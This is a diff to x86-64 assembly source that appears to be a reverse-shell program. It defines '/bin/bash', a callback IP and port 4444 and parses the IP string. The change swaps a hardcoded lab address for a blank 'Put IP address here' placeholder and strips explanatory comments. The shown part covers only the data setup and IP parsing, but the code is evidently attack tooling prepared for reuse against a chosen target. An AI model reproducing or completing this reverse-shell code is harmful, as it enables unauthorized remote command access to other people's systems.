@@ -1,6 +1,6 @@
 section .data
     command db '/bin/bash', 0
-    ip_str db '192.168.116.132', 0
+    ip_str db '', 0 ; Put IP address here
     port_str db '4444', 0
     
     err_ip_format db 'Error: Invalid IP format', 10, 0
@@ -34,19 +34,19 @@ validate_and_parse_ip:
     push rdx
     push r9
     
-    lea rsi, [ip_str]       ; Source string
-    lea rdi, [ip_bytes]     ; Destination (will store as single dword)
-    xor rbx, rbx            ; Byte counter (0-3)
-    xor rax, rax            ; Current number
-    xor rcx, rcx            ; Character index
-    xor r9, r9              ; Final IP value (32-bit)
+    lea rsi, [ip_str]      
+    lea rdi, [ip_bytes]    
+    xor rbx, rbx            
+    xor rax, rax            
+    xor rcx, rcx            
+    xor r9, r9             
     
 parse_ip_loop:
-    movzx rdx, byte [rsi + rcx]  ; Load next character
-    test rdx, rdx                ; Check for null terminator
+    movzx rdx, byte [rsi + rcx]  
+    test rdx, rdx                
     jz validate_last_octet
     
-    cmp rdx, '.'                 ; Check for dot separator
+    cmp rdx, '.'                 
     je store_octet
     
     cmp rdx, '0'
